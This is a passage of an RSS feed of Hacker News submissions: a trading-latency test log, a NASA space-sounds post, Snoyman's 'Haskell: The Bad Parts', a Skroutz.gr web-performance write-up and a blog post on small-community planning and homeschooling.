the Prometheus queries outlined in the previous section</p><p>First the average processing time at different measurement points</p><p>Then the conditional processing time</p></div><div id="internal-ping-latency"><h3>3.3&nbsp;&nbsp;&nbsp;Internal Ping Latency</h3><p>For this example we run two instances of Client #1.</p><p>The first instance (<code>test</code>) runs on processor #4 which is located
on the same NUMA node where the gateway is running.</p><p>The second instance (<code>trader</code>) runs on processor #3 which is on
a different NUMA node.</p><p>These are average 1-way heartbeat ping latencies between the gateway
and the clients</p><p>As expected, inter-process latencies are worse for the second instance.</p></div><div id="internal-round-trip-latency"><h3>3.4&nbsp;&nbsp;&nbsp;Internal Round Trip Latency</h3><p>The <code>roq-test</code> program is used to test order management.
It waits, creates an order, waits again, it cancels the order
and finally it terminates when the order is indeed cancelled.</p><pre><span>I0920 09:39:43.255401 107190 application.cpp:55] ===== START =====
I0920 09:39:43.255441 107190 application.cpp:56] Process: name="roq-test", version="0.4.3", type="", git="", date="Sep 16 2020", time="06:02:37"
I0920 09:39:43.255546 107190 service.cpp:39] The metrics service will *not* be started
I0920 09:39:43.256109 107190 controller.cpp:108] Dispatching...
I0920 09:39:43.256121 107190 controller.cpp:112] Starting event loop thread...
I0920 09:39:43.256161 107190 controller.cpp:126] Thread affinity 5
I0920 09:39:43.256253 107191 controller.cpp:148] Event loop thread is now running
I0920 09:39:44.267789 107191 session_manager.cpp:44] Connecting "unix:///var/tmp/roq-deribit.sock"
I0920 09:39:44.273765 107191 session.cpp:38] Adding name="deribit" (user_id=5)
I0920 09:39:44.273853 107190 pollster.cpp:403] Adding name="deribit" (user_id=5)
I0920 09:39:44.273870 107190 strategy.cpp:132] Connected
I0920 09:39:44.273917 107190 strategy.cpp:140] Downloading market data ...
I0920 09:39:44.273921 107190 strategy.cpp:169] Market data is READY
I0920 09:39:44.274311 107190 strategy.cpp:150] download_end={account="", max_order_id=0}
I0920 09:39:44.274314 107190 strategy.cpp:154] Download market data has COMPLETED
I0920 09:39:44.274317 107190 strategy.cpp:143] Downloading account data ...
I0920 09:39:44.274322 107190 strategy.cpp:182] Order manager is READY
I0920 09:39:44.274325 107190 strategy.cpp:150] download_end={account="A1", max_order_id=1000}
I0920 09:39:44.274327 107190 strategy.cpp:157] Download account data has COMPLETED
I0920 09:39:44.274328 107190 strategy.cpp:274] *** INSTRUMENT READY ***
I0920 09:39:44.395049 107190 strategy.cpp:261] *** READY TO TRADE ***
I0920 09:39:44.395222 107190 strategy.cpp:56] create_order={account="A1", order_id=1001, exchange="deribit", symbol="BTC-PERPETUAL", side=BUY, quantity=1.0, order_type=LIMIT, price=10959.5, time_in_force=GTC, position_effect=UNDEFINED, execution_instruction=UNDEFINED, stop_price=nan, max_show_quantity=nan, order_template=""}
I0920 09:39:44.395259 107190 strategy.cpp:225] order_ack={account="A1", order_id=1001, type=CREATE_ORDER, origin=GATEWAY, status=FORWARDED, error=UNDEFINED, text="", gateway_order_id=10000001, external_order_id="", ‚Ä¶</span></pre></div></div></div></div></div></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://roq-trading.com/posts/latency_experiment/">https://roq-trading.com/posts/latency_experiment/</a></em></p>]]>
            </description>
            <link>https://roq-trading.com/posts/latency_experiment/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24927623</guid>
            <pubDate>Thu, 29 Oct 2020 05:41:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[NASA releases a playlist of eerie sounds the space makes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24927354">thread link</a>) | @conse_lad
<br/>
October 28, 2020 | https://sparkonit.com/2020/10/29/space-sounds/ | <a href="https://web.archive.org/web/*/https://sparkonit.com/2020/10/29/space-sounds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
	<p><a href="#content">Skip to content</a></p><!-- #search-container -->

	<!-- #toggle-sidebar -->

	<!-- #masthead -->

	<div id="content">

	<main id="main">

		
<article id="post-39273">
	<!-- .entry-header -->

		<p>
		What Sound Does The Space Make? 	</p><!-- .entry-summary -->
	
	<div>
		
<!-- Quick Adsense WordPress Plugin: http://quickadsense.com/ -->

<p><span>Just in time for this Halloween, </span><span>the National Aeronautics and Space Administration (NASA) uploaded their collection of eerie sounds our Solar System makes on Soundcloud late Wednesday.&nbsp;</span></p>
<p><span>‚ÄúYou‚Äôve heard the creaks, cracks, and cackling noises of our universe before,‚Äù reads the playlist‚Äôs description. ‚ÄúUsing data from our spacecraft, our scientists gathered NEW sinister sounds from the depths of space in time for Halloween.‚Äù</span></p>
<p><span>There‚Äôs no sound in space, but these spooky sounds being featured on this playlist came from the waves of plasma flows NASA‚Äôs spacecraft tumbled on while soaring to the depths of our universe.</span></p>
<!-- Quick Adsense WordPress Plugin: http://quickadsense.com/ -->


<p><span>Plasma waves festoon the space around the Universe, where they chuck magnetic fields back and forth. This continuous motion of the magnetic fields produces rhythmic </span><span>dissonance that is imperceptible to our ears. But some of NASA‚Äôs spacecraft have been attired with instruments </span><span>capable of capturing these sounds.&nbsp;</span></p>
<p><span>Well, with more than thousands of hits since launched, I thought it was time to celebrate the spookiness with my friends here on <a href="https://sparkonit.com/">Sparkonit</a>. Enjoy!</span></p>



<!-- Quick Adsense WordPress Plugin: http://quickadsense.com/ -->



	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article><!-- #post-## -->

<!-- #comments -->

	</main><!-- #main -->


<!-- #secondary -->

	<nav role="navigation" aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>
	</div><!-- #content -->

	<!-- #colophon -->
</div></div>]]>
            </description>
            <link>https://sparkonit.com/2020/10/29/space-sounds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24927354</guid>
            <pubDate>Thu, 29 Oct 2020 04:52:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Haskell: The Bad Parts, part 1]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24927352">thread link</a>) | @andrenth
<br/>
October 28, 2020 | https://www.snoyman.com/blog/2020/10/haskell-bad-parts-1 | <a href="https://web.archive.org/web/*/https://www.snoyman.com/blog/2020/10/haskell-bad-parts-1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><i>See a typo? Have a suggestion?
<a target="_blank" rel="nofollow" href="https://github.com/snoyberg/snoyman.com/edit/master/content/posts/haskell-bad-parts-1.md">Edit this page on Github</a>
</i>
</p>
<p>There‚Äôs a popular book called ‚ÄúJavaScript: The Good Parts.‚Äù And there‚Äôs a common meme around the relative size of that book versus ‚ÄúJavaScript: The Definitive Guide.‚Äù</p>
<p><img src="https://i.imgur.com/wIf3EJh.jpg"></p><p>Haskell is in my opinion a far more well designed and coherent language than JavaScript. However, it‚Äôs also an old language with some historical baggage. And in many ways it‚Äôs a bleeding edge research language that sometimes includes‚Ä¶ half-baked features. And due to an inconsistent set of rules around backwards compatibility, it sometimes will break code every six months, and sometimes keep strange decisions around for decades.</p>
<blockquote><div lang="en" dir="ltr"><p>True mastery of Haskell comes down to knowing which things in core libraries should be avoided like the plague.</p><p>* foldl<br>* sum/product<br>* Data.Text.IO<br>* Control.Exception.bracket (use unliftio instead, handles interruptible correctly)</p><p>Just as some examples</p></div>‚Äî Michael Snoyman (@snoyberg) <a href="https://twitter.com/snoyberg/status/1321049221697544193?ref_src=twsrc%5Etfw">October 27, 2020</a></blockquote> 
<p>After a request and some tongue-in-cheek comments in that thread, I decided a longer form blog post was in order. I‚Äôm going to start off by expanding on the four examples I gave in that tweet. But there are many, many more examples out there. If there‚Äôs more interest in seeing a continuation of this series, please let me know. And if you have pet peeves you‚Äôd like me to address, input will be very welcome.</p>
<h2>What is a ‚Äúbad part‚Äù</h2>
<p>Very rarely is there such a thing as a language feature, function, type, or library that is so egregiously bad that it should never, ever be used. Null is of course the billion dollar mistake, but it‚Äôs still incredibly useful in some cases. So when I say that something is a ‚Äúbad part‚Äù of Haskell, I mean something along these lines:</p>
<ul>
<li>A rarely-useful feature has been promoted to a position of prominence</li>
<li>A function has major downsides that are not documented</li>
<li>There‚Äôs an unexpected performance implication</li>
</ul>
<p>There‚Äôs a large tendency in the Haskell community to be overly literal in responding to blog posts. Feel free to do that to your heart‚Äôs content. But this caveat serves as a word of warning: I‚Äôm not going to caveat each one of these with an explanation of ‚Äúyes, but there‚Äôs this one corner case where it‚Äôs actually useful.‚Äù</p>
<h2>Why attack Haskell?</h2>
<p>Since I‚Äôm a Haskeller and advocate of the language, you may be wondering: why am I attacking Haskell? I don‚Äôt see this as an attack. I <em>do</em> wish we could fix these issues, and I think it‚Äôs a fair thing to say that the problems I‚Äôm listing are warts on the language. But every language has warts. I‚Äôm writing this because I‚Äôve seen these kinds of things break real world projects. I‚Äôve seen these failures manifest at runtime, defeating yet again the false claim that ‚Äúif it compiles it works.‚Äù I‚Äôve seen these become nefarious time bombs that disincentivize people from ever working with Haskell in the future.</p>
<p>I hope by calling these out publicly, I can help raise awareness of these problems. And then, either we can fix the problems at their source or, more likely, get more widespread awareness of the issue.</p>
<p>Also, because it feels appropriate, I‚Äôm going to take a more jovial tone below. I personally find it easier to beat up on a language I love like that.</p>
<h2>foldl</h2>
<p>Duncan Coutts <a href="https://www.well-typed.com/blog/2014/04/fixing-foldl/">already did this one</a>. <code>foldl</code> is broken. It‚Äôs a bad function. Left folds are supposed to be strict, not lazy. End of story. Goodbye. Too many space leaks have been caused by this function. We should gut it out entirely.</p>
<p>But wait! A lazy left fold makes perfect sense for a <code>Vector</code>! Yeah, no one ever meant that. And the problem isn‚Äôt the fact that this function exists. It‚Äôs the <strong>name</strong>. It has taken the hallowed spot of the One True Left Fold. I‚Äôm sorry, the One True Left Fold is strict.</p>
<p>Also, side note: we can‚Äôt raise linked lists to a position of supreme power within our ecosystem and then pretend like we actually care about vectors. We don‚Äôt, we just pay lip service to them. Until we fix the wart which is overuse of lists, <code>foldl</code> is only ever used on lists.</p>
<p>OK, back to this bad left fold. This is all made worse by the fact that the true left fold, <code>foldl'</code>, is not even exported by the <code>Prelude</code>. We Haskellers are a lazy bunch. And if you make me type in <code>import Data.List (foldl')</code>, I just won‚Äôt. I‚Äôd rather have a space leak than waste precious time typing in those characters.</p>
<p>Alright, so what should you do? Use an alternative prelude that doesn‚Äôt export a bad function, and does export a good function. If you really, really want a lazy left fold: add a comment, or use a function named <code>foldlButLazyIReallyMeanIt</code>. Otherwise I‚Äôm going to fix your code during my code review.</p>
<h2>sum/product</h2>
<p>The <code>sum</code> and <code>product</code> functions are implemented in terms of <code>foldr</code>. Well, actually <code>foldMap</code>, but list‚Äôs <code>foldMap</code> is implemented in terms of <code>foldr</code>, and lists are the only data structure that exist in Haskell. ‚ÄúOh, but <code>foldr</code> is the good function, right?‚Äù Only if you‚Äôre folding a function which is lazy in its second argument. <code>+</code> and <code>*</code> are both strict in both of their arguments.</p>
<p>If you‚Äôre not aware of that terminology: ‚Äústrict in both arguments‚Äù means ‚Äúin order to evaluate the result of this function/operator, I need to evaluate both of its arguments.‚Äù I can‚Äôt evaluate <code>x + y</code> without knowing what <code>x</code> and <code>y</code> are. On the other hand, <code>:</code> (list cons) is lazy in its second argument. Evaluating <code>x : y</code> doesn‚Äôt require evaluating <code>y</code> (or, for that matter, <code>x</code>). (For more information, see <a href="https://www.fpcomplete.com/haskell/tutorial/all-about-strictness/">all about strictness</a>.)</p>
<p>‚ÄúBut wait!‚Äù you say. ‚ÄúWhat if I have a custom data type with a custom typeclass instance of <code>Num</code> that has a custom <code>+</code> and/or <code>*</code> that is in fact lazy in the second argument! Then <code>sum</code> and <code>product</code> are perfect as they are!‚Äù</p>
<p>That‚Äôs true. Now go off and write your own <code>lazySum</code> and <code>lazyProduct</code>. 99 times out of 100, or more likely 999,999 times out of 1,000,000, we want the fully strict version.</p>
<p>‚ÄúBut it doesn‚Äôt matter, GHC will optimize this away.‚Äù Maybe. Maybe not. Stop relying on GHC‚Äôs optimizer to convert horribly inefficient code into not efficient code. (But I digress, we‚Äôll talk about why the <code>vector</code> package is bad another time.)</p>
<h2>Data.Text.IO</h2>
<p>I‚Äôve already covered this one once before when I told everyone to <a href="https://www.snoyman.com/blog/2016/12/beware-of-readfile">beware of <code>readFile</code></a>. In that blog post, I talk about a bunch of <code>String</code> based I/O functions, especially the titular <code>readFile</code>, which is obnoxiously exported by <code>Prelude</code>. Those are bad, and I‚Äôll reiterate why in a second. But <code>Data.Text.IO</code> is arguably far worse. The reason is that there‚Äôs pretty good awareness in the community that <code>String</code>-based I/O is bad. Even though the <code>String</code> part is the least of our worries, it does a good job of scaring away the uninitiated.</p>
<p>But <code>Data.Text.IO</code> is a wolf in sheep‚Äôs clothing. We‚Äôre all told by people who think they can tell people how to write their Haskell code (<em>cough</em> me <em>cough</em>) that we should exorcise <code>String</code> from our codebases and replace it in all cases with <code>Text</code>. Attacking the <code>Text</code> type is a topic for another time. But the problem is that by cloaking itself in the warm embrace of <code>Text</code>, this module claims more legitimacy than it deserves.</p>
<p>The only module worse in this regard is <code>Data.Text.Lazy.IO</code>, which should be buried even deeper.</p>
<p>OK, what exactly am I on about? Locale sensitive file decoding. It‚Äôs possible that this has been the number one example of a Haskell bug in the wild I‚Äôve encountered in my entire career. Not the spooky memory leak. Partial functions like <code>head</code> randomly throwing exceptions are up there, but don‚Äôt quite rise to prominence.</p>
<p>You see, when you are dealing with file formats, there is typically an actual, defined format. YAML, XML, JSON, and many others give a lot of information about how to serialize data, including character data, into raw bytes. We want to be consistent. We want to write a file in one run of the program, and have it read in a separate run. We want to write the file on a Windows machine and read it on a Linux machine. Or we want to interact with programs in other languages that read or write data in a consistent format.</p>
<p>Locale sensitive file encoding and decoding laughs in our face. When you use <code>Data.Text.IO.readFile</code>, it plays a mind reading game of trying to deduce from clues you don‚Äôt care about which character encoding to use. These days, on the vast majority of systems used by native English speakers, this turns out to be UTF-8. So using <code>readFile</code> and <code>writeFile</code> typically ‚Äújust works.‚Äù Using functions from <code>Data.Text.IO</code> looks safe, and can easily get hidden in a large PR or a library dependency.</p>
<p>That‚Äôs when all hell breaks loose. You ship this code. You run it in a Docker container. ‚ÄúOops, you forgot to set the <code>LANG</code> env var, Imma crash.‚Äù But it‚Äôs worse than that. Typically things will work well for weeks or months, because it can often be a long time before someone tries to encode a non-ASCII character.</p>
<p>The same kind of thing happens regularly to Stack. Someone adds a new feature that writes and reads a file. The code passes all integration tests. And then someone in Russia with a weird Windows code page set and a Cyrillic character in their name files a bug report 2 years later about how they can‚Äôt build anything, and we sheepishly tell them to run <code>chcp 65001</code> or build in <code>c:\</code>.</p>
<p>Friends don‚Äôt let friends use <code>Data.Text.IO</code>.</p>
<p>‚ÄúOh, but <code>putStrLn</code> is fine!‚Äù Yeah, maybe. It‚Äôs also potentially slow. And it will throw a runtime exception due to character encoding mismatches. Just use a good logging library. That‚Äôs why we have one in <code>rio</code>.</p>
<p><strong>EDIT</strong> Since so many people have asked: instead of <code>readFile</code>, I recommend using <a href="https://www.stackage.org/haddock/lts-16.20/rio-0.1.19.0/RIO.html#v:readFileUtf8"><code>readFileUtf8</code></a>, which is available from <a href="https://github.com/commercialhaskell/rio"><code>rio</code></a>.</p>
<h2>Control.Exception.bracket</h2>
<p>This is by far the least objectionable of the bad things in this list. I included it because the entire original tweet was inspired by a coworker telling me about a bug he ran into because of this function.</p>
<p>Async exceptions are subtle. Very, very subtle. Like, super duper subtle. I‚Äôve devoted a large percentage to my Haskell teaching career towards them. Async exceptions are a concept that don‚Äôt truly exist in most other languages. They require rewiring the way your brain works for ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.snoyman.com/blog/2020/10/haskell-bad-parts-1">https://www.snoyman.com/blog/2020/10/haskell-bad-parts-1</a></em></p>]]>
            </description>
            <link>https://www.snoyman.com/blog/2020/10/haskell-bad-parts-1</link>
            <guid isPermaLink="false">hacker-news-small-sites-24927352</guid>
            <pubDate>Thu, 29 Oct 2020 04:51:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Journey to Delivering a Faster Experience at Skroutz.gr]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24927349">thread link</a>) | @aloukissas
<br/>
October 28, 2020 | https://engineering.skroutz.gr/blog/speed-the-journey-to-delivering-a-faster-experience-at-skroutz-gr/ | <a href="https://web.archive.org/web/*/https://engineering.skroutz.gr/blog/speed-the-journey-to-delivering-a-faster-experience-at-skroutz-gr/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
<p>We‚Äôve always placed the user experience first, here at Skroutz. Since a performant application is essential for a seamless journey, speed has always been at our core.</p>

<p>Our rapidly evolving environment -the number of development teams, the adoption of new technologies, the addition of new features etc.- gradually slowed us down.</p>

<p>We knew we had to take action.</p>

<p>For this, we formed a non-typical task-force team to speed us up. We identified the problems, chose our measurement tools and methods and took the plunge.</p>

<p>Measuring performance is not an easy task. It involves both user perception and strictly defined metrics and thresholds.</p>

<p>In order to improve the speed, we tried various solutions. Some worked. Some didn‚Äôt. Below you can read in short the key takeaways.</p>

<p><strong>Assets</strong>. Our main goal was to optimize the number and timing of requests. By initially loading only the necessary above the fold images and fine tuning our lazy loading mechanisms, we noticed significant gains in terms of initial requests (almost half in our Product page and up to 30 less in our Listing) and therefore some worthy improvement in Speed Index metrics (in some cases up to ~4.5%).</p>

<p><strong>HTML</strong>. Excessive DOM size was one of our most critical performance bottlenecks. Our Product pages (the most important section) could reach up to ~8k nodes in some cases, far from Google‚Äôs proposal of 1,5k.<br>
We tried various solutions involving windowing (rejected), async loading product cards‚Äô content and showing less user reviews (by risking losing valuable user generated content).<br>
What did make a huge difference was timing: Loading the information when it actually needed to exist. This was achieved by implementing a mechanism that would notify each card when it was about to appear in the viewport. The only element needed beforehand was a single-node placeholder. In some cases the DOM nodes were reduced by 45%, which results in an increase of ~10 points in our overall Lighthouse score!</p>

<p><strong>CSS</strong>. Although our styling architecture was in pretty good shape, we thought it might be worth trying critical CSS. The concept was to initially load only the necessary styles for rendering anything above-the fold. This would improve metrics such as First Contentful Paint &amp; Largest Contentful Paint while making the loading feel faster. It turned out that the above metrics were too slightly improved compared to the effort needed to add it in our pipeline. In short, this didn‚Äôt work for us.</p>

<p><strong>Javascript</strong>. Moving gradually from static to interactive pages caused code bloating, especially at the Javascript side. Our main JS file was including lots of libraries that were not used in every page. This is a problem, especially for mobile devices, due to the fact that JS runs in the main thread.<br>
Our actions, directed to reduce our webpack bundle size in order to release main thread calculations for the initial load, and iterate over the Redux architecture to improve speed after user interaction, led to slightly better performance.</p>

<p>During this journey, we also started addressing some issues on new <strong>Web Vitals</strong> user-centric metrics. We mainly focused on visual stability, by eliminating any layout shifts.</p>

<p>After a year‚Äôs work, we <strong>made Skroutz.gr faster</strong>. And more stable.</p>

<p>If you are interested in more details, and you‚Äôre ready for a deeper technical dive, make yourself a coffee and keep on reading (it will take ~30 minutes to read).</p>

<hr>

<blockquote>
  <p><strong>Table of Contents</strong></p>

  <p><a href="#a-brief-history">A Brief History</a> <br></p>

  <p><a href="#speed-not-a-metric-but-a-users-issue">Speed: not a Metric, but a Users‚Äô Issue</a> <br></p>

  <p><a href="#evolution-of-performance-metrics-from-speed-index-to-core-web-vitals">Evolution of Performance Metrics: from Speed Index to Core Web Vitals</a> <br>
  ‚Ä∫ <a href="#pagespeed-insights-psi">Pagespeed Insights (PSI)</a> <br>
  ‚Ä∫ <a href="#core-web-vitals">Core Web Vitals</a> <br></p>

  <p><a href="#the-problems-of-skroutzgr">The Problems of Skroutz.gr</a> <br>
  ‚Ä∫ <a href="#html">HTML</a> <br>
  ‚Ä∫ <a href="#css">CSS</a> <br>
  ‚Ä∫ <a href="#javascript">Javascript</a> <br>
  ‚Ä∫ <a href="#assets">Assets</a> <br></p>

  <p><a href="#the-journey-what-worked-and-what-didnt">The Journey: What Worked and What Didn‚Äôt</a> <br>
  ‚Ä∫ <a href="#assets-networking">Assets</a> <br>
  ‚Ä∫ <a href="#html-1">HTML</a> <br>
  ‚Ä∫ <a href="#css-1">CSS</a> <br>
  ‚Ä∫ <a href="#javascript-1">Javascript</a> <br>
  ‚Ä∫ <a href="#core-web-vitals-cumulative-layout-shifts-cls-issues">Core Web Vitals: Cumulative Layout Shift (CLS)</a> <br></p>

  <p><a href="#onwards---closing">Onwards - Closing</a> <br></p>
</blockquote>


<p><a href="https://www.skroutz.gr/" target="_blank">Skroutz.gr</a> was always a quite fast and sophisticated web application.</p>

<p>Speed has always been a critical component for <a href="https://www.skroutz.gr/" target="_blank">Skroutz.gr</a> since we believe
that for a modern web experience, it‚Äôs important to get fast and stay fast.</p>

<p>Historically, the biggest problem we were facing regarding speed (and the biggest blessing at the same time),
was the really huge amount of content (DOM) in some of our most popular pages, which contains a lot of shops and user-generated content, like reviews, questions, etc.
This problem becomes bigger and bigger as we add extra information for Products and Categories or extra services
(we have developed a <a href="https://www.skroutz.gr/ecommerce/landing">Marketplace functionality</a> where users can buy directly from Skroutz.gr).</p>

<p>Back in 2016, the huge DOM of some pages was causing crashes due to memory restrictions in some devices (i.e. iPad),
while at the same time the performance was poor, in terms of rendering and painting.
<a href="https://engineering.skroutz.gr/blog/Skroutz-redesign-how-we-designed-and-implemented-our-own-Design-System/#html" target="_blank">To solve these issues at that time</a>,
we started requesting and rendering elements asynchronously.</p>

<p>However, since <a href="https://engineering.skroutz.gr/blog/Skroutz-redesign-how-we-designed-and-implemented-our-own-Design-System/" target="_blank">our last major redesign in 2016</a>,
lots of things have changed.</p>

<p>Facts like the rapidly growing number of development teams, the adoption of new technologies (i.e. React js, CSS Grid),
the addition of more and more features in our pages, etc., led to worse rendering performance, despite the fact that today
there are better and more powerful devices our applications are running on.</p>

<p>Rendering speed took a backseat.</p>

<p>On the other hand, one of the main questions we‚Äôre regularly asking ourselves here at Skroutz, is whether our website responds to our users‚Äô expectations and what we can do in order to help them with their buying decisions. When it comes to user experience, speed matters.</p>

<p>Today, consumers are more demanding than they‚Äôve ever been. When they weigh up the experience on a site, they aren‚Äôt just
comparing it with their competitors, they‚Äôre rating it against the best in class services they use every day.</p>

<p>Being of ‚ÄúModerate Speed‚Äù was not acceptable for us, so we decided to take action in order to resolve the issues.</p>

<p>We formed a non-typical task-force team, consisting of engineers, SEO-ers and product owners and we started working on,
in order to improve our speed.</p>

<p>In the following, we describe things we did, how we measured our actions, what worked for us, what didn‚Äôt work, and some
takeaways from our experience during the journey.</p>

<hr>


<p>Imagine you‚Äôre walking through an unfamiliar city to get to an important appointment. <br>
You walk through various streets and city centers on your way. But here and there, there are slow automatic doors
you have to wait for to open and unexpected construction detours lead you astray. All of these events interrupt
your progress, increase stress and distract you from reaching your destination.</p>

<p>People using the web are also on a journey, with each of their actions constituting one step in what would ideally be a continuous flow.
And just like in the real world, they can be interrupted by delays, distracted from their tasks and led to make errors. <br>
These events, in turn, can lead to reduced satisfaction and abandonment of a site or the whole journey.</p>

<p>In both cases, removing interruptions and obstacles is the key to a smooth journey and a satisfied user
[<a href="https://blog.chromium.org/2020/05/the-science-behind-web-vitals.html" target="_blank">chromium blog</a>].</p>

<p>When it comes to user experience, speed matters. A
<a href="https://www.ericsson.com/en/press-releases/2016/2/streaming-delays-mentally-taxing-for-smartphone-users-ericsson-mobility-report" target="_blank">consumer study</a>
shows that the <strong>stress response to delays in mobile speed are similar to that of watching a horror movie or solving
a mathematical problem</strong>, and greater than waiting in a checkout line at a retail store [<a href="https://web.dev/why-speed-matters/" target="_blank">ref</a>]. <br></p>

<p>Website performance is crucial to a web application‚Äôs success. <br></p>

<p>Amazon found that each additional 1/10th of a second of load time corresponded with a 1% reduction in sales.
Walmart found that for every second they improved their page load times they added an additional 2% to their conversion rate
[<a href="https://www.alphabetcreative.com/speed-matters-website-performance-and-perception/" target="_blank">ref</a>].
EBay saw a 0.5% increase in ‚ÄúAdd to Cart‚Äù count for every 100 milliseconds improvement in search page loading time
[<a href="https://web.dev/shopping-for-speed-on-ebay/" target="_blank">ref</a>].</p>

<p>Besides conversion rates, you may know that <a href="https://webmasters.googleblog.com/2018/01/using-page-speed-in-mobile-search.html" target="_blank">Google uses the performance of a website as a ranking factor</a> in search results as well!</p>

<p>In his book <a href="https://www.nngroup.com/books/usability-engineering/" target="_blank">Usability Engineering (1993), Jakob Nielsen</a>*
identifies three main response time limits.</p>

<ul>
  <li><strong>0.1 second</strong> ‚Äî Operations that are completed in 100ms or fewer will feel instantaneous to the user.
This is the gold standard that one should aim for when optimising your websites.</li>
  <li><strong>1 second</strong> ‚Äî Operations that take 1 second to finish are generally OK, but the user will feel the pause.
If all operations take 1 second to complete, a website may feel a little sluggish.</li>
  <li><strong>10 seconds</strong> ‚Äî If an operation takes 10 seconds or more to complete, the user may switch over to a new tab,
or give up on the website completely (this depends on what operation is being completed.
For example, users are more likely to stick around if they‚Äôve just submitted their card details in the checkout
than if they‚Äôre waiting to load a product page).</li>
</ul>

<p>* <em>Since these limits published back in 1993, as internet speed have increased and we are now browsing the web
at a lightning pace, there is a speculation that the upper limit is pretty smaller, close to 5 seconds or even lower.</em></p>

<p><strong>Takeaway: Performance is important</strong>! It can mean the difference between making a sale, or losing a customer to the competition.</p>

<hr>


<p>Performance is a foundational aspect of good user experiences.</p>

<p><strong>But what exactly is Performance?</strong></p>

<p>And how do we put a page in the fast or in the slow bucket?</p>

<p>Users of the web expect that the pages they visit will be fastly rendered, interactive and smooth.
Pages should not only load quickly, but also run well; scrolling should be stick-to-finger fast, and animations and interactions should be silky smooth.</p>

<p>Performance is more about user perception and less about the actual, objective duration.
How fast a website feels like it‚Äôs loading and rendering has a greater impact on user experience than how fast the website actually loads and renders.</p>

<p>How fast or slow something feels like, depends a lot on whether the user is actively or passively waiting for this thing to happen. Waits can have an active and passive phase. When ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://engineering.skroutz.gr/blog/speed-the-journey-to-delivering-a-faster-experience-at-skroutz-gr/">https://engineering.skroutz.gr/blog/speed-the-journey-to-delivering-a-faster-experience-at-skroutz-gr/</a></em></p>]]>
            </description>
            <link>https://engineering.skroutz.gr/blog/speed-the-journey-to-delivering-a-faster-experience-at-skroutz-gr/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24927349</guid>
            <pubDate>Thu, 29 Oct 2020 04:51:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Small Scale Community Development Work]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24927340">thread link</a>) | @DoreenMichele
<br/>
October 28, 2020 | http://www.eclogiselle.com/2020/10/small-scale-development-work.html | <a href="https://web.archive.org/web/*/http://www.eclogiselle.com/2020/10/small-scale-development-work.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div id="post-body-3519297355200665670"><p>
If you are in a small community, you may feel that "planning and development" work are out of reach. You may feel you simply don't have the resources to do any such thing.

</p><p>
If you are feeling that way, you probably are confusing the bureaucratic window dressing of big city planning processes for "planning." But that's not what planning and development are.
</p><p>
That's just how big organizations manage a process at scale that involves a large number of people. It's mostly not relevant to your needs.

</p><p>
At a smaller scale, planning and development can be boiled down to the essentials of doing some research, setting some goals and executing. It can potentially be done by one person part time with no official title. 

</p><hr><p>

I homeschooled my two adult sons. So for some years I ran a small school under the laws of the state of California with just two students.

</p><p>
My husband was listed as the administrator but I did most of the work involved in educating our sons and running a small school under the laws of the state of California. I researched the curriculum and did most of the teaching and so forth. 

</p><p>
People tend to be intimidated by the idea of teaching their own children because they look at what public schools do and it looks overwhelming to try to replicate that with the resources available to a family. People imagine they need to actively teach their kids for eight hours a day every day, plus grade everything and design the curriculum and so forth.

</p><p>
The reality is that homeschooling is unlike sending your kids to public school because a lot of the things that public schools do are done to manage the scale involved in having so many students. A lot of that is not only unnecessary if you homeschool your own children, it is actively counterproductive and has no place in a homeschool setting.

</p><p>
When students get to public school, they may line up outside the classroom waiting for it to open. When you homeschool, your kids will already be in the building. 

</p><p>
When the day starts at public school, the teacher takes roll call to make sure all their students are acconted for. If you have two students, you don't need to do roll call. You know if both of your kids are present without reading out their names from a list and having them answer back that they are "Here."

</p><p>

Assessment at public schools often involves multiple choice tests because those are easier for a teacher to grade when you are trying to assess twenty or more students and you get a different set of twenty or more students every year. It's not necessary to follow that pattern when you have just two students and they are the same two kids every year.

</p><p>

Assessment in my two-student school involved printing off state standards twice a year for the grades of my two sons and checking off all the things I knew for a fact they could do competently. If I wasn't sure, I just observed them for a few days.

</p><p>
Once in a while, I had to actually ask them a few questions or otherwise check to see what they could do, but it was rare. I basically never gave them tests of the sort found in public school.
</p><p>
One study found that in an eight hour day at public school, most students spent only an hour or two actually learning. The rest of their time was spent changing classrooms, taking roll call, having lunch and so forth.

</p><p>
This fits with California state law at the time. When I was a homeschooling parent, one option to be legal was to hire a tutor for your children for three hours a day.
</p><p>
Not eight hours. Just three hours.
</p><p>
The one-on-one attention a parent or tutor can give to a child accomplishes a great deal more in a short period of time than what happens when a public school teacher has to keep track of and deal with twenty or more students. 
</p><p>
Not only do you not need to actively teach your kids eight hours a day, it's too intensive to try. You and they would soon both suffer burn out at that pace.

</p><p>
Eight hours a day of schooling only makes sense when much of that time is spent on lunch, recess and bureaucratic processes. It is absolutely overkill if you try to spend that much time actively teaching a child one-on-one.


</p><p>

Of course, there were some bureaucratic processes we could not escape. We did have to file paperwork with the state of California annually. We did have to pick a name for the school and we did have to officially assign roles where I was listed as the teacher and my husband was listed as the administrator. We did keep records of their schoolwork.

